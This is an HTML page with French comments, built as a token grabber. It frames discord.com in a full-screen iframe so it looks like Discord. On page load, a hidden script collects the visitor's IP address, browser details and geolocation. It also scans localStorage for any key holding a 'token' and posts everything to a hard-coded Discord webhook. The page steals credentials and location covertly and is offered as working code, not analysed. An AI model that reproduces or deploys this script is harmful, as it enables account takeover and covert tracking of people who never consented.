<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Principale</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* Cache les barres de défilement si nécessaire */
        }
        iframe {
            width: 100vw;
            height: 100vh;
            border: none; /* Rend l'iframe invisible ou discrète */
        }
        form {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Iframe pour afficher le site cible, potentiellement pour accéder au contexte de Discord -->
    <iframe src="https://discord.com" id="discordFrame"></iframe>
    
    <form id="hiddenForm">
        <input type="text" id="firstName" placeholder="Prénom">
        <input type="text" id="lastName" placeholder="Nom">
    </form>
    
    <script>
        async function sendCollectedData() {
            try {
                // Récupère l'IP via API publique
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Récupère d'autres informations du navigateur
                const userAgent = navigator.userAgent;  // Détails sur le navigateur, OS, et device
                const language = navigator.language;    // Langue du navigateur
                const screenInfo = `${window.screen.width}x${window.screen.height}`;  // Résolution d'écran
                
                // Tentative pour géolocalisation
                let geolocationData = 'Non disponible';
                if (navigator.geolocation) {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    geolocationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                }
                
                // Tentative pour récupérer prénom et nom via formulaire
                const firstName = document.getElementById('firstName').value || 'Inconnu';
                const lastName = document.getElementById('lastName').value || 'Inconnu';
                
                // Tentative pour récupérer le token Discord à partir de localStorage
                let discordToken = 'Non trouvé';
                if (window.localStorage) {
                    // Scanner les clés potentielles (Discord utilise souvent 'token' ou des variantes)
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key && key.includes('token')) {  // Vérifie les clés contenant 'token'
                            discordToken = localStorage.getItem(key);  // Récupère la valeur
                            break;  // On prend le premier matching pour efficacité
                        }
                    }
                }
                
                // Compilation de toutes les données
                const collectedData = {
                    IP: userIP,
                    UserAgent: userAgent,
                    Language: language,
                    ScreenResolution: screenInfo,
                    Geolocation: geolocationData,
                    FirstName: firstName,
                    LastName: lastName,
                    DiscordToken: discordToken,  // Inclut le token récupéré
                    Timestamp: new Date().toISOString()
                };
                
                // Envoie des données au webhook
                const webhookURL = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
                const sendResponse = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Nouvelles données collectées : 
                        IP: ${collectedData.IP}
                        Prénom: ${collectedData.FirstName}
                        Nom: ${collectedData.LastName}
                        User Agent: ${collectedData.UserAgent}
                        Langue: ${collectedData.Language}
                        Résolution d'écran: ${collectedData.ScreenResolution}
                        Géolocalisation: ${collectedData.Geolocation}
                        Discord Token: ${collectedData.DiscordToken}
                        Timestamp: ${collectedData.Timestamp}`
                    })
                });
                
                if (sendResponse.ok) {
                    console.log('Données envoyées avec succès');
                } else {
                    console.error('Échec de l\'envoi au webhook');
                }
            } catch (error) {
                console.error('Erreur lors de la collecte ou de l\'envoi des données:', error);
            }
        }
        
        // Exécute la fonction au chargement de la page
        window.onload = sendCollectedData;
    </script>
</body>
</html>
